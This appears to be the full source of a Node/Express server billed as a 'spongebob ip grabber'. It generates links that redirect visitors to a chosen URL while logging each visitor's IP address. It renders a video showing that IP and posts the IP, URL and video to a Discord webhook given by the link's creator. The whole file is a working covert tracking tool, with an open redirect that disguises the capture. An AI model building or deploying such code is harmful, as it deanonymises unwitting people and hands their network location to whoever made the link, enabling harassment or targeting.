import { exec } from "child_process";
import cors from "cors";
import dotenv from "dotenv";
import express from "express";
import FormData from "form-data";
import { createReadStream, readdirSync, rm } from "fs";
import { nanoid } from "nanoid";
import { dirname, join as joinPath } from "path";

dotenv.config();

const IPv4 =
        /^(\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/,
    IPv6 =
        /^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/;

const PROD = process.env.NODE_ENV === "production",
    DIRNAME = PROD ? dirname(process.execPath) : __dirname,
    images = readdirSync(joinPath(DIRNAME, "clips")).filter(img =>
        /^sp-\d+\.png$/.test(img)
    ),
    getRandomImg = () =>
        joinPath(
            DIRNAME,
            "clips",
            images[Math.floor(Math.random() * images.length)]
        );
console.log(images);

const PORT = process.env.PORT || 8000,
    app = express();

app.use(cors());

app.use(express.static(joinPath(__dirname, "public")));

app.get("/link", (req, res) => {
    let ip = (req.headers["x-forwarded-for"] ||
        req.socket.remoteAddress) as string;

    if (ip.startsWith("::ffff:")) ip = ip.substring(7);
    // avoid some funny request forgery business
    if (!(IPv4.test(ip) || IPv6.test(ip)))
        return void (
            console.log(`invalid ip: ${ip}`)! ||
            res.status(400).send("Invalid IP")
        );

    const { url, wh } = req.query;

    if (!(url && wh))
        return void res.send(
            'invalid parameters: generate a link <a href="/">here</a>'
        );

    const out = joinPath(DIRNAME, nanoid(5) + ".mp4"),
        img = getRandomImg();

    console.log(`request received: ${img} ${ip} ${out}`);

    // render video
    const p = exec(
        `python3 ${joinPath(DIRNAME, "video.py")} "${img}" "${ip}" "${out}"`,
        { cwd: DIRNAME },
        (err, stdout, stderr) => {
            if (err) {
                console.error(err);
                return;
            }

            console.log(`rendered file ${out}`);
            console.log("stdout: " + stdout);

            // send to discord
            const form = new FormData();
            form.append("username", "spongebob ip grabber");
            form.append("avatar_url", "https://i.imgur.com/duzZ00c.png");
            form.append("content", `\`${ip}\`\n<${url}>`);
            form.append("file", createReadStream(out));
            form.submit(wh as string, () => {
                // delete video after submitting
                // I'm not worried about caching the video because the browser caches the redirect response anyways
                rm(out, () => {});
            });
        }
    );

    res.redirect(301, url as string);
});

app.listen(PORT, () => {
    console.log(`server online: ${PORT}`);
});
